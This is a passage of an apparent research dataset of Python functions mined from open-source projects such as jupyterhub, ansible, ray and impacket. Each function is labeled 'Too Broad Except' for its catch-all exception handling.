                self._process.close()
                self._process.waitForFinished(1000)
            except Exception:
                pass
        self._fired = True",Too Broad Except,1
168,jupyterhub,/home/r4ph/desenv/phd/exception-miner/projects/py/jupyterhub/jupyterhub/handlers/base.py,finish_user_spawn,"async def finish_user_spawn():
            """"""Finish the user spawn by registering listeners and notifying the proxy.

            If the spawner is slow to start, this is passed as an async callback,
            otherwise it is called immediately.
            """"""
            # wait for spawn Future
            await spawn_future
            toc = IOLoop.current().time()
            self.log.info(
                ""User %s took %.3f seconds to start"", user_server_name, toc - tic
            )
            self.statsd.timing('spawner.success', (toc - tic) * 1000)
            SERVER_SPAWN_DURATION_SECONDS.labels(
                status=ServerSpawnStatus.success
            ).observe(time.perf_counter() - spawn_start_time)
            self.eventlog.record_event(
                'hub.jupyter.org/server-action',
                1,
                {'action': 'start', 'username': user.name, 'servername': server_name},
            )
            proxy_add_start_time = time.perf_counter()
            spawner._proxy_pending = True
            try:
                await self.proxy.add_user(user, server_name)

                PROXY_ADD_DURATION_SECONDS.labels(status='success').observe(
                    time.perf_counter() - proxy_add_start_time
                )
                RUNNING_SERVERS.inc()
            except Exception:
                self.log.exception(""Failed to add %s to proxy!"", user_server_name)
                self.log.error(
                    ""Stopping %s to avoid inconsistent state"", user_server_name
                )
                await user.stop(server_name)
                PROXY_ADD_DURATION_SECONDS.labels(status='failure').observe(
                    time.perf_counter() - proxy_add_start_time
                )
            else:
                spawner.add_poll_callback(self.user_stopped, user, server_name)
            finally:
                spawner._proxy_pending = False",Too Broad Except,1
169,ansible,/home/r4ph/desenv/exception-miner/projects/py/ansible/lib/ansible/plugins/action/yum.py,run,"def run(self, tmp=None, task_vars=None):
        '''
        Action plugin handler for yum3 vs yum4(dnf) operations.

        Enables the yum module to use yum3 and/or yum4. Yum4 is a yum
        command-line compatibility layer on top of dnf. Since the Ansible
        modules for yum(aka yum3) and dnf(aka yum4) call each of yum3 and yum4's
        python APIs natively on the backend, we need to handle this here and
        pass off to the correct Ansible module to execute on the remote system.
        '''

        self._supports_check_mode = True
        self._supports_async = True

        result = super(ActionModule, self).run(tmp, task_vars)
        del tmp  # tmp no longer has any effect

        # Carry-over concept from the package action plugin
        if 'use' in self._task.args and 'use_backend' in self._task.args:
            raise AnsibleActionFail(""parameters are mutually exclusive: ('use', 'use_backend')"")

        module = self._task.args.get('use', self._task.args.get('use_backend', 'auto'))

        if module == 'dnf':
            module = 'auto'

        if module == 'auto':
            try:
                if self._task.delegate_to:  # if we delegate, we should use delegated host's facts
                    module = self._templar.template(""{{hostvars['%s']['ansible_facts']['pkg_mgr']}}"" % self._task.delegate_to)
                else:
                    module = self._templar.template(""{{ansible_facts.pkg_mgr}}"")
            except Exception:
                pass  # could not get it from template!

        if module not in VALID_BACKENDS:
            facts = self._execute_module(
                module_name=""ansible.legacy.setup"", module_args=dict(filter=""ansible_pkg_mgr"", gather_subset=""!all""),
                task_vars=task_vars)
            display.debug(""Facts %s"" % facts)
            module = facts.get(""ansible_facts"", {}).get(""ansible_pkg_mgr"", ""auto"")
            if (not self._task.delegate_to or self._task.delegate_facts) and module != 'auto':
                result['ansible_facts'] = {'pkg_mgr': module}

        if module not in VALID_BACKENDS:
            result.update(
                {
                    'failed': True,
                    'msg': (""Could not detect which major revision of yum is in use, which is required to determine module backend."",
                            ""You should manually specify use_backend to tell the module whether to use the yum (yum3) or dnf (yum4) backend})""),
                }
            )

        else:
            if module in {""yum4"", ""dnf4""}:
                module = ""dnf""

            # eliminate collisions with collections search while still allowing local override
            module = 'ansible.legacy.' + module

            if not self._shared_loader_obj.module_loader.has_plugin(module):
                result.update({'failed': True, 'msg': ""Could not find a yum module backend for %s."" % module})
            else:
                new_module_args = self._task.args.copy()
                if 'use_backend' in new_module_args:
                    del new_module_args['use_backend']
                if 'use' in new_module_args:
                    del new_module_args['use']

                display.vvvv(""Running %s as the backend for the yum action plugin"" % module)
                result.update(self._execute_module(
                    module_name=module, module_args=new_module_args, task_vars=task_vars, wrap_async=self._task.async_val))

        # Cleanup
        if not self._task.async_val:
            # remove a temporary path we created
            self._remove_tmp_path(self._connection._shell.tmpdir)

        return result",Too Broad Except,1
170,backtrader,/home/r4ph/desenv/phd/exception-miner/projects/py/backtrader/backtrader/plot/locator.py,get_locator,"def get_locator(self, dmin, dmax):
        'Pick the best locator based on a distance.'
        delta = relativedelta(dmax, dmin)
        tdelta = dmax - dmin

        # take absolute difference
        if dmin > dmax:
            delta = -delta
            tdelta = -tdelta

        # The following uses a mix of calls to relativedelta and timedelta
        # methods because there is incomplete overlap in the functionality of
        # these similar functions, and it's best to avoid doing our own math
        # whenever possible.
        numYears = float(delta.years)
        numMonths = (numYears * MONTHS_PER_YEAR) + delta.months
        numDays = tdelta.days   # Avoids estimates of days/month, days/year
        numHours = (numDays * HOURS_PER_DAY) + delta.hours
        numMinutes = (numHours * MIN_PER_HOUR) + delta.minutes
        numSeconds = np.floor(tdelta.total_seconds())
        numMicroseconds = np.floor(tdelta.total_seconds() * 1e6)

        nums = [numYears, numMonths, numDays, numHours, numMinutes,
                numSeconds, numMicroseconds]

        use_rrule_locator = [True] * 6 + [False]

        # Default setting of bymonth, etc. to pass to rrule
        # [unused (for year), bymonth, bymonthday, byhour, byminute,
        #  bysecond, unused (for microseconds)]
        byranges = [None, 1, 1, 0, 0, 0, None]

        usemicro = False  # use as flag to avoid raising an exception

        # Loop over all the frequencies and try to find one that gives at
        # least a minticks tick positions.  Once this is found, look for
        # an interval from an list specific to that frequency that gives no
        # more than maxticks tick positions. Also, set up some ranges
        # (bymonth, etc.) as appropriate to be passed to rrulewrapper.
        for i, (freq, num) in enumerate(zip(self._freqs, nums)):
            # If this particular frequency doesn't give enough ticks, continue
            if num < self.minticks:
                # Since we're not using this particular frequency, set
                # the corresponding by_ to None so the rrule can act as
                # appropriate
                byranges[i] = None
                continue

            # Find the first available interval that doesn't give too many
            # ticks
            for interval in self.intervald[freq]:
                if num <= interval * (self.maxticks[freq] - 1):
                    break
            else:
                # We went through the whole loop without breaking, default to
                # the last interval in the list and raise a warning
                warnings.warn('AutoDateLocator was unable to pick an '
                              'appropriate interval for this date range. '
                              'It may be necessary to add an interval value '
                              ""to the AutoDateLocator's intervald dictionary.""
                              ' Defaulting to {0}.'.format(interval))

            # Set some parameters as appropriate
            self._freq = freq

            if self._byranges[i] and self.interval_multiples:
                byranges[i] = self._byranges[i][::interval]
                interval = 1
            else:
                byranges[i] = self._byranges[i]

            # We found what frequency to use
            break
        else:
            if False:
                raise ValueError(
                    'No sensible date limit could be found in the '
                    'AutoDateLocator.')
            else:
                usemicro = True

        if not usemicro and use_rrule_locator[i]:
            _, bymonth, bymonthday, byhour, byminute, bysecond, _ = byranges

            rrule = rrulewrapper(self._freq, interval=interval,
                                 dtstart=dmin, until=dmax,
                                 bymonth=bymonth, bymonthday=bymonthday,
                                 byhour=byhour, byminute=byminute,
                                 bysecond=bysecond)

            locator = RRuleLocator(self._dates, rrule, self.tz)
        else:
            if usemicro:
                interval = 1  # not set because the for else: was met
            locator = MicrosecondLocator(interval, tz=self.tz)

        locator.set_axis(self.axis)

        try:
            # try for matplotlib < 3.6.0
            locator.set_view_interval(*self.axis.get_view_interval())
            locator.set_data_interval(*self.axis.get_data_interval())
        except Exception as e:
            try:
                # try for matplotlib >= 3.6.0
                self.axis.set_view_interval(*self.axis.get_view_interval())
                self.axis.set_data_interval(*self.axis.get_data_interval())
                locator.set_axis(self.axis)
            except Exception as e:
                print(""Error:"", e)

        return locator",Too Broad Except,1
171,openbbterminal,/home/r4ph/desenv/phd/exception-miner/projects/py/openbbterminal/openbb_terminal/cryptocurrency/cryptocurrency_helpers.py,load_from_ccxt,"def load_from_ccxt(
    symbol: str,
    start_date: datetime = (datetime.now() - timedelta(days=1100)),
    interval: str = ""1440"",
    exchange: str = ""binance"",
    to_symbol: str = ""usdt"",
    end_date: datetime = datetime.now(),
) -> pd.DataFrame:
    """"""Load crypto currency data [Source: https://github.com/ccxt/ccxt]

    Parameters
    ----------
    symbol: str
        Coin to get
    start_date: datetime
        The datetime to start at
    interval: str
        The interval between data points in minutes.
        Choose from: 1, 15, 30, 60, 240, 1440, 10080, 43200
    exchange: str:
        The exchange to get data from.
    to_symbol: str
        Quote Currency (Defaults to usdt)
    end_date: datetime
        The datetime to stop at

    Returns
    -------
    pd.DataFrame
        Dataframe consisting of price and volume data
    """"""
    df = pd.DataFrame()
    pair = f""{symbol.upper()}/{to_symbol.upper()}""

    try:
        if interval not in list(CCXT_INTERVAL_MAP):
            console.print(
                f""\nInvalid interval chosen for source, ""
                f""available intervals: {', '.join(list(CCXT_INTERVAL_MAP))}\n""
            )
        df = fetch_ccxt_ohlc(
            exchange,
            3,
            pair,
            CCXT_INTERVAL_MAP[interval],
            int(datetime.timestamp(start_date)) * 1000,
            1000,
        )
        if df.empty:
            console.print(f""\nPair {pair} not found in {exchange}\n"")
            return pd.DataFrame()
        i = 0
        for date in df.index:
            if date > end_date:
                break
            i += 1
        first_date = pd.to_datetime(str(df.index.values[0]))
        df = df.iloc[0:i]
        if df.empty:
            console.print(
                f""\nThe first data point retrieved was {first_date.strftime('%Y-%m-%d')}, ""
                f""thus the end date ({end_date.strftime('%Y-%m-%d')}) filtered out all of the data.\n""
            )
            return pd.DataFrame()
    except Exception:
        console.print(f""\nPair {pair} not found on {exchange}\n"")
        return df
    return df",Too Broad Except,1
172,synapse,/home/r4ph/desenv/phd/exception-miner/projects/py/synapse/synapse/appservice/api.py,query_user,"async def query_user(self, service: ""ApplicationService"", user_id: str) -> bool:
        if service.url is None:
            return False

        # This is required by the configuration.
        assert service.hs_token is not None

        try:
            args = None
            if self.config.use_appservice_legacy_authorization:
                args = {""access_token"": service.hs_token}

            response = await self.get_json(
                f""{service.url}{APP_SERVICE_PREFIX}/users/{urllib.parse.quote(user_id)}"",
                args,
                headers=self._get_headers(service),
            )
            if response is not None:  # just an empty json object
                return True
        except CodeMessageException as e:
            if e.code == 404:
                return False
            logger.warning(""query_user to %s received %s"", service.url, e.code)
        except Exception as ex:
            logger.warning(""query_user to %s threw exception %s"", service.url, ex)
        return False",Too Broad Except,1
173,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/pupy/external/LaZagne/Windows/lazagne/softwares/browsers/ie.py,get_hash_table,"def get_hash_table(self):
        # get the url list
        urls = self.get_history()

        # calculate the hash for all urls found on the history
        hash_tables = []
        for u in range(len(urls)):
            try:
                h = (urls[u] + '\0').encode('UTF-16LE')
                hash_tables.append([h, hashlib.sha1(h).hexdigest().lower()])
            except Exception:
                self.debug(traceback.format_exc())
        return hash_tables",Too Broad Except,1
174,ray,/home/r4ph/desenv/exception-miner/projects/py/ray/python/ray/autoscaler/_private/node_launcher.py,_launch_node,"def _launch_node(
        self, config: Dict[str, Any], count: int, node_type: str
    ) -> Optional[Dict]:
        if self.node_types:
            assert node_type, node_type

        # The `worker_nodes` field is deprecated in favor of per-node-type
        # node_configs. We allow it for backwards-compatibility.
        launch_config = copy.deepcopy(config.get(""worker_nodes"", {}))
        if node_type:
            launch_config.update(
                config[""available_node_types""][node_type][""node_config""]
            )
        resources = copy.deepcopy(
            config[""available_node_types""][node_type][""resources""]
        )
        labels = copy.deepcopy(
            config[""available_node_types""][node_type].get(""labels"", {})
        )
        launch_hash = hash_launch_conf(launch_config, config[""auth""])
        node_config = copy.deepcopy(config.get(""worker_nodes"", {}))
        node_tags = {
            TAG_RAY_NODE_NAME: ""ray-{}-worker"".format(config[""cluster_name""]),
            TAG_RAY_NODE_KIND: NODE_KIND_WORKER,
            TAG_RAY_NODE_STATUS: STATUS_UNINITIALIZED,
            TAG_RAY_LAUNCH_CONFIG: launch_hash,
        }
        # A custom node type is specified; set the tag in this case, and also
        # merge the configs. We merge the configs instead of overriding, so
        # that the bootstrapped per-cloud properties are preserved.
        # TODO(ekl) this logic is duplicated in commands.py (keep in sync)
        if node_type:
            node_tags[TAG_RAY_USER_NODE_TYPE] = node_type
            node_config.update(launch_config)

        node_launch_start_time = time.time()

        error_msg = None
        full_exception = None
        created_nodes = {}
        try:
            created_nodes = self.provider.create_node_with_resources_and_labels(
                node_config, node_tags, count, resources, labels
            )
        except NodeLaunchException as node_launch_exception:
            self.node_provider_availability_tracker.update_node_availability(
                node_type, int(node_launch_start_time), node_launch_exception
            )

            if node_launch_exception.src_exc_info is not None:
                full_exception = ""\n"".join(
                    traceback.format_exception(*node_launch_exception.src_exc_info)
                )

            error_msg = (
                f""Failed to launch {{}} node(s) of type {node_type}. ""
                f""({node_launch_exception.category}): ""
                f""{node_launch_exception.description}""
            )
        except Exception:
            error_msg = f""Failed to launch {{}} node(s) of type {node_type}.""
            full_exception = traceback.format_exc()
        else:
            # Record some metrics/observability information when a node is launched.
            launch_time = time.time() - node_launch_start_time
            for _ in range(count):
                # Note: when launching multiple nodes we observe the time it
                # took all nodes to launch for each node. For example, if 4
                # nodes were created in 25 seconds, we would observe the 25
                # second create time 4 times.
                self.prom_metrics.worker_create_node_time.observe(launch_time)
            self.prom_metrics.started_nodes.inc(count)
            self.node_provider_availability_tracker.update_node_availability(
                node_type=node_type,
                timestamp=int(node_launch_start_time),
                node_launch_exception=None,
            )

        if error_msg is not None:
            self.event_summarizer.add(
                error_msg,
                quantity=count,
                aggregate=operator.add,
            )
            self.log(error_msg)
            self.prom_metrics.node_launch_exceptions.inc()
            self.prom_metrics.failed_create_nodes.inc(count)
        else:
            self.log(""Launching {} nodes, type {}."".format(count, node_type))
            self.event_summarizer.add(
                ""Adding {} node(s) of type "" + str(node_type) + ""."",
                quantity=count,
                aggregate=operator.add,
            )

        if full_exception is not None:
            self.log(full_exception)

        return created_nodes",Too Broad Except,1
175,impacket,/home/r4ph/desenv/phd/exception-miner/projects/py/impacket/tests/dcerpc/test_wkst.py,test_NetrAddAlternateComputerName,"def test_NetrAddAlternateComputerName(self):
        dce, rpc_transport = self.connect()
        req = wkst.NetrAddAlternateComputerName()
        req['ServerName'] = '\x00'*10
        req['AlternateName'] = 'FREEFLY\x00'
        req['DomainAccount'] = NULL
        req['EncryptedPassword'] = NULL
        try:
            resp2 = dce.request(req)
            resp2.dump()
        except Exception as e:
            if str(e).find('ERROR_NOT_SUPPORTED') < 0 and str(e).find('ERROR_INVALID_PASSWORD') < 0:
                raise",Too Broad Except,1
176,gitsome,/home/r4ph/desenv/phd/exception-miner/projects/py/gitsome/xonsh/ptk2/shell.py,prompt_tokens,"def prompt_tokens(self):
        """"""Returns a list of (token, str) tuples for the current prompt.""""""
        p = builtins.__xonsh__.env.get(""PROMPT"")
        try:
            p = self.prompt_formatter(p)
        except Exception:  # pylint: disable=broad-except
            print_exception()
        toks = partial_color_tokenize(p)
        if self._first_prompt:
            carriage_return()
            self._first_prompt = False
        self.settitle()
        return PygmentsTokens(toks)",Too Broad Except,1
177,pytest,/home/r4ph/desenv/phd/exception-miner/projects/py/pytest/src/_pytest/compat.py,safe_isclass,"def safe_isclass(obj: object) -> bool:
    """"""Ignore any exception via isinstance on Python 3.""""""
    try:
        return inspect.isclass(obj)
    except Exception:
        return False",Too Broad Except,1
178,kitty,/home/r4ph/desenv/exception-miner/projects/py/kitty/kitty/rc/set_spacing.py,parse_spacing_settings,"def parse_spacing_settings(args: Iterable[str]) -> Dict[str, Optional[float]]:
    mapper: Dict[str, List[str]] = {}
    for q in ('margin', 'padding'):
        mapper[q] = f'{q}-left {q}-top {q}-right {q}-bottom'.split()
        mapper[f'{q}-h'] = mapper[f'{q}-horizontal'] = f'{q}-left {q}-right'.split()
        mapper[f'{q}-v'] = mapper[f'{q}-vertical'] = f'{q}-top {q}-bottom'.split()
        for edge in ('left', 'top', 'right', 'bottom'):
            mapper[f'{q}-{edge}'] = [f'{q}-{edge}']
    settings: Dict[str, Optional[float]] = {}
    for spec in args:
        parts = spec.split('=', 1)
        if len(parts) != 2:
            raise ValueError(f'{spec} is not a valid setting')
        which = mapper.get(parts[0].lower())
        if not which:
            raise ValueError(f'{parts[0]} is not a valid edge specification')
        if parts[1].lower() == 'default':
            val = None
        else:
            try:
                val = float(parts[1])
            except Exception:
                raise ValueError(f'{parts[1]} is not a number')
        for q in which:
            settings[q] = val
    return settings",Too Broad Except,1
179,zappa,/home/r4ph/desenv/phd/exception-miner/projects/py/zappa/zappa/core.py,undeploy_api_gateway,"def undeploy_api_gateway(self, lambda_name, domain_name=None, base_path=None):
        """"""
        Delete a deployed REST API Gateway.
        """"""
        print(""Deleting API Gateway.."")

        api_id = self.get_api_id(lambda_name)

        if domain_name:

            # XXX - Remove Route53 smartly here?
            # XXX - This doesn't raise, but doesn't work either.

            try:
                self.apigateway_client.delete_base_path_mapping(
                    domainName=domain_name,
                    basePath='(none)' if base_path is None else base_path
                )
            except Exception as e:
                # We may not have actually set up the domain.
                pass

        was_deleted = self.delete_stack(lambda_name, wait=True)

        if not was_deleted:
            # try erasing it with the older method
            for api in self.get_rest_apis(lambda_name):
                self.apigateway_client.delete_rest_api(
                    restApiId=api['id']
                )",Too Broad Except,1
180,quantaxis,/home/r4ph/desenv/phd/exception-miner/projects/py/quantaxis/QUANTAXIS/QASU/save_tdx.py,_save_option_commodity_cu_day,"def _save_option_commodity_cu_day(
        client=DATABASE,
        ui_log=None,
        ui_progress=None
):
    ##################### CU 铜 ############################################################################
    option_cu_contract_list = QA_fetch_get_commodity_option_CU_contract_time_to_market(
    )
    coll_option_commodity_cu_day = client.option_commodity_cu_day
    coll_option_commodity_cu_day.create_index(
        [(""code"",
          pymongo.ASCENDING),
         (""date_stamp"",
          pymongo.ASCENDING)]
    )
    err = []

    def __saving_work(code, coll_option_commodity_cu_day):
        try:
            QA_util_log_info(
                '##JOB12 Now Saving OPTION_DAY_COMMODITY_CU 铜 ==== {}'.format(
                    str(code)
                ),
                ui_log=ui_log
            )

            # 首选查找数据库 是否 有 这个代码的数据
            # 期权代码 从 10000001 开始编码  10001228
            ref = coll_option_commodity_cu_day.find({'code': str(code)[0:8]})
            end_date = str(now_time())[0:10]

            # 当前数据库已经包含了这个代码的数据， 继续增量更新
            # 加入这个判断的原因是因为如果是刚上市的 数据库会没有数据 所以会有负索引问题出现
            if ref.count() > 0:

                # 接着上次获取的日期继续更新
                start_date = ref[ref.count() - 1]['date']
                QA_util_log_info(
                    ' 上次获取期权CU日线数据的最后日期是 {}'.format(start_date),
                    ui_log=ui_log
                )

                QA_util_log_info(
                    'UPDATE_OPTION_CU_DAY \n 从上一次下载数据开始继续 Trying update {} from {} to {}'
                        .format(code,
                                start_date,
                                end_date),
                    ui_log=ui_log
                )
                if start_date != end_date:

                    start_date0 = QA_util_get_next_day(start_date)
                    df0 = QA_fetch_get_option_day(
                        code=code,
                        start_date=start_date0,
                        end_date=end_date,
                        frequence='day',
                        ip=None,
                        port=None
                    )
                    retCount = df0.iloc[:, 0].size
                    QA_util_log_info(
                        ""日期从开始{}-结束{} , 合约代码{} , 返回了{}条记录 , 准备写入数据库"".format(
                            start_date0,
                            end_date,
                            code,
                            retCount
                        ),
                        ui_log=ui_log
                    )
                    coll_option_commodity_cu_day.insert_many(
                        QA_util_to_json_from_pandas(df0)
                    )
                else:
                    QA_util_log_info(
                        ""^已经获取过这天的数据了^ {}"".format(start_date),
                        ui_log=ui_log
                    )

            else:
                start_date = '1990-01-01'
                QA_util_log_info(
                    'UPDATE_CU_OPTION_DAY \n 从新开始下载数据 Trying update {} from {} to {}'
                        .format(code,
                                start_date,
                                end_date),
                    ui_log=ui_log
                )
                if start_date != end_date:

                    df0 = QA_fetch_get_option_day(
                        code=code,
                        start_date=start_date,
                        end_date=end_date,
                        frequence='day',
                        ip=None,
                        port=None
                    )
                    retCount = df0.iloc[:, 0].size
                    QA_util_log_info(
                        ""日期从开始{}-结束{} , 合约代码{} , 获取了{}条记录 , 准备写入数据库^_^ "".format(
                            start_date,
                            end_date,
                            code,
                            retCount
                        ),
                        ui_log=ui_log
                    )

                    coll_option_commodity_cu_day.insert_many(
                        QA_util_to_json_from_pandas(df0)
                    )
                else:
                    QA_util_log_info(
                        ""*已经获取过这天的数据了* {}"".format(start_date),
                        ui_log=ui_log
                    )

        except Exception as error0:
            print(error0)
            err.append(str(code))

    for item in range(len(option_cu_contract_list)):
        QA_util_log_info(
            'The {} of Total {}'.format(item,
                                        len(option_cu_contract_list)),
            ui_log=ui_log
        )

        strLogProgress = 'DOWNLOAD PROGRESS {} '.format(
            str(float(item / len(option_cu_contract_list) * 100))[0:4] + '%'
        )
        intLogProgress = int(
            float(item / len(option_cu_contract_list) * 10000.0)
        )
        QA_util_log_info(
            strLogProgress,
            ui_log=ui_log,
            ui_progress=ui_progress,
            ui_progress_int_value=intLogProgress
        )

        __saving_work(
            option_cu_contract_list[item].code,
            coll_option_commodity_cu_day
        )

    if len(err) < 1:
        QA_util_log_info('SUCCESS save option cu day ^_^ ', ui_log=ui_log)
    else:
        QA_util_log_info(' ERROR CODE \n ', ui_log=ui_log)
        QA_util_log_info(err, ui_log=ui_log)",Too Broad Except,1
181,impacket,/home/r4ph/desenv/phd/exception-miner/projects/py/impacket/examples/goldenPac.py,do_put,"def do_put(self, s):
        try:
            if self.transferClient is None:
                self.connect_transferClient()
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = '/'

            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')
            f = dst_path + '/' + src_file
            pathname = f.replace('/','\\')
            logging.info(""Uploading %s to %s\\%s"" % (src_file, self.share, dst_path))
            if PY3:
                self.transferClient.putFile(self.share, pathname, fh.read)
            else:
                self.transferClient.putFile(self.share, pathname.decode(sys.stdin.encoding), fh.read)
            fh.close()
        except Exception as e:
            logging.error(str(e))
            pass

        self.send_data('\r\n')",Too Broad Except,1
182,real-esrgan,/home/r4ph/desenv/exception-miner/projects/py/real-esrgan/cog_predict.py,clean_folder,"def clean_folder(folder):
    for filename in os.listdir(folder):
        file_path = os.path.join(folder, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception as e:
            print(f'Failed to delete {file_path}. Reason: {e}')",Too Broad Except,1
183,ciphey,/home/r4ph/desenv/phd/exception-miner/projects/py/ciphey/ciphey/basemods/Decoders/a1z26.py,decode,"def decode(self, ctext: T) -> Optional[U]:
        """"""
        Performs A1Z26 decoding
        """"""
        logging.debug(""Attempting A1Z26"")
        ctext_converted = []
        ctext_split = re.split(r""[ ,;:\-\n]"", ctext)
        delimiters = set(sorted(re.sub(r""[^ ,;:\-\n]"", """", ctext)))
        ctext_num = re.sub(r""[,;:\-\s]"", """", ctext)
        ctext_decoded = """"
        if ctext_num.isnumeric() is False:
            logging.debug(""Failed to decode A1Z26 due to non numeric character(s)"")
            return None
        try:
            for i in ctext_split:
                val = int(i)
                if val > 26 or val < 1:
                    logging.debug(
                        f""Failed to decode A1Z26 due to invalid number '{val}'""
                    )
                    return None
                val2 = int(i) + 96
                ctext_converted.append(chr(val2))
            ctext_decoded = """".join(ctext_converted)
            logging.info(
                f""A1Z26 successful, returning '{ctext_decoded}' with delimiter(s) {delimiters}""
            )
            return ctext_decoded
        except Exception:
            return None",Too Broad Except,1
184,ray,/home/r4ph/desenv/exception-miner/projects/py/ray/release/ray_release/command_runner/anyscale_job_runner.py,_handle_command_output,"def _handle_command_output(
        self, job_status_code: int, error: str, raise_on_timeout: bool = True
    ):
        if job_status_code == -2:
            raise JobBrokenError(f""Job state is 'BROKEN' with error:\n{error}\n"")

        if job_status_code == -3:
            raise JobTerminatedError(
                ""Job entered 'TERMINATED' state (it was terminated ""
                ""manually or Ray was stopped):""
                f""\n{error}\n""
            )

        if job_status_code == -4:
            raise JobTerminatedBeforeStartError(
                ""Job entered 'TERMINATED' state before it started ""
                ""(most likely due to inability to provision required nodes; ""
                ""otherwise it was terminated manually or Ray was stopped):""
                f""\n{error}\n""
            )

        # First try to obtain the output.json from S3.
        # If that fails, try logs.
        try:
            output_json = self.fetch_output()
        except Exception:
            logger.exception(""Exception when obtaining output from S3."")
            try:
                logs = self.get_last_logs()
                output_json = re.search(r""### JSON \|([^\|]*)\| ###"", logs)
                output_json = json.loads(output_json.group(1))
            except Exception:
                output_json = None

        workload_status_code = None
        if output_json:
            logger.info(f""Output: {output_json}"")
            workload_status_code = output_json[""return_code""]
            workload_time_taken = output_json[""workload_time_taken""]
            prepare_return_codes = output_json[""prepare_return_codes""]
            last_prepare_time_taken = output_json[""last_prepare_time_taken""]

            # If we know results/metrics were not uploaded, we can fail fast
            # fetching later.
            self._results_uploaded = output_json[""uploaded_results""]
            self._metrics_uploaded = output_json[""uploaded_metrics""]
            self._artifact_uploaded = output_json[""uploaded_artifact""]

            if prepare_return_codes and prepare_return_codes[-1] != 0:
                if prepare_return_codes[-1] == TIMEOUT_RETURN_CODE:
                    raise PrepareCommandTimeout(
                        ""Prepare command timed out after ""
                        f""{last_prepare_time_taken} seconds.""
                    )
                raise PrepareCommandError(
                    f""Prepare command '{self.prepare_commands[-1]}' returned ""
                    f""non-success status: {prepare_return_codes[-1]} with error:""
                    f""\n{error}\n""
                )
        else:
            raise JobNoLogsError(""Could not obtain logs for the job."")

        if workload_status_code == TIMEOUT_RETURN_CODE:
            if not raise_on_timeout:
                # Expected - treat as success.
                return

            raise TestCommandTimeout(
                f""Command timed out after {workload_time_taken} seconds.""
            )

        if workload_status_code is not None and workload_status_code != 0:
            raise TestCommandError(
                f""Command returned non-success status: {workload_status_code} with ""
                f""error:\n{error}\n""
            )

        if job_status_code == -1:
            raise JobOutOfRetriesError(
                ""Job returned non-success state: 'OUT_OF_RETRIES' ""
                ""(command has not been ran or no logs could have been obtained) ""
                f""with error:\n{error}\n""
            )",Too Broad Except,1
185,ray,/home/r4ph/desenv/exception-miner/projects/py/ray/python/ray/air/integrations/wandb.py,_set_api_key,"def _set_api_key(api_key_file: Optional[str] = None, api_key: Optional[str] = None):
    """"""Set WandB API key from `wandb_config`. Will pop the
    `api_key_file` and `api_key` keys from `wandb_config` parameter.

    The order of fetching the API key is:
      1) From `api_key` or `api_key_file` arguments
      2) From WANDB_API_KEY environment variables
      3) User already logged in to W&B (wandb.api.api_key set)
      4) From external hook WANDB_SETUP_API_KEY_HOOK
    """"""
    if os.environ.get(WANDB_MODE_ENV_VAR) in {""offline"", ""disabled""}:
        return

    if api_key_file:
        if api_key:
            raise ValueError(""Both WandB `api_key_file` and `api_key` set."")
        with open(api_key_file, ""rt"") as fp:
            api_key = fp.readline().strip()

    if not api_key and not os.environ.get(WANDB_ENV_VAR):
        # Check if user is already logged into wandb.
        try:
            wandb.ensure_configured()
            if wandb.api.api_key:
                logger.info(""Already logged into W&B."")
                return
        except AttributeError:
            pass
        # Try to get API key from external hook
        if WANDB_SETUP_API_KEY_HOOK in os.environ:
            try:
                api_key = _load_class(os.environ[WANDB_SETUP_API_KEY_HOOK])()
            except Exception as e:
                logger.exception(
                    f""Error executing {WANDB_SETUP_API_KEY_HOOK} to setup API key: {e}"",
                    exc_info=e,
                )
    if api_key:
        os.environ[WANDB_ENV_VAR] = api_key
    elif not os.environ.get(WANDB_ENV_VAR):
        raise ValueError(
            ""No WandB API key found. Either set the {} environment ""
            ""variable, pass `api_key` or `api_key_file` to the""
            ""`WandbLoggerCallback` class as arguments, ""
            ""or run `wandb login` from the command line"".format(WANDB_ENV_VAR)
        )",Too Broad Except,1
186,ansible,/home/r4ph/desenv/exception-miner/projects/py/ansible/test/lib/ansible_test/_util/controller/tools/collection_detail.py,read_manifest_json,"def read_manifest_json(collection_path):
    """"""Return collection information from the MANIFEST.json file.""""""
    manifest_path = os.path.join(collection_path, 'MANIFEST.json')

    if not os.path.exists(manifest_path):
        return None

    try:
        with open(manifest_path, encoding='utf-8') as manifest_file:
            manifest = json.load(manifest_file)

        collection_info = manifest.get('collection_info') or {}

        result = dict(
            version=collection_info.get('version'),
        )
        validate_version(result['version'])
    except Exception as ex:  # pylint: disable=broad-except
        raise Exception('{0}: {1}'.format(os.path.basename(manifest_path), ex))

    return result",Too Broad Except,1
187,modin,/home/r4ph/desenv/phd/exception-miner/projects/py/modin/modin/pandas/test/dataframe/test_map_metadata.py,test_drop_duplicates,"def test_drop_duplicates(data, keep, subset, ignore_index):
    modin_df = pd.DataFrame(data)
    pandas_df = pandas.DataFrame(data)

    try:
        pandas_df.drop_duplicates(
            keep=keep, inplace=False, subset=subset, ignore_index=ignore_index
        )
    except Exception as err:
        with pytest.raises(type(err)):
            modin_df.drop_duplicates(
                keep=keep, inplace=False, subset=subset, ignore_index=ignore_index
            )
    else:
        df_equals(
            pandas_df.drop_duplicates(
                keep=keep, inplace=False, subset=subset, ignore_index=ignore_index
            ),
            modin_df.drop_duplicates(
                keep=keep, inplace=False, subset=subset, ignore_index=ignore_index
            ),
        )

    try:
        pandas_results = pandas_df.drop_duplicates(
            keep=keep, inplace=True, subset=subset, ignore_index=ignore_index
        )
    except Exception as err:
        with pytest.raises(type(err)):
            modin_df.drop_duplicates(
                keep=keep, inplace=True, subset=subset, ignore_index=ignore_index
            )
    else:
        modin_results = modin_df.drop_duplicates(
            keep=keep, inplace=True, subset=subset, ignore_index=ignore_index
        )
        df_equals(modin_results, pandas_results)",Too Broad Except,1
188,localstack,/home/r4ph/desenv/exception-miner/projects/py/localstack/tests/integration/cloudformation/resources/test_lambda.py,wait_esm_active,"def wait_esm_active():
            try:
                return (
                    aws_client.awslambda.get_event_source_mapping(UUID=esm_id)[""State""] == ""Enabled""
                )
            except Exception as e:
                print(e)",Too Broad Except,1
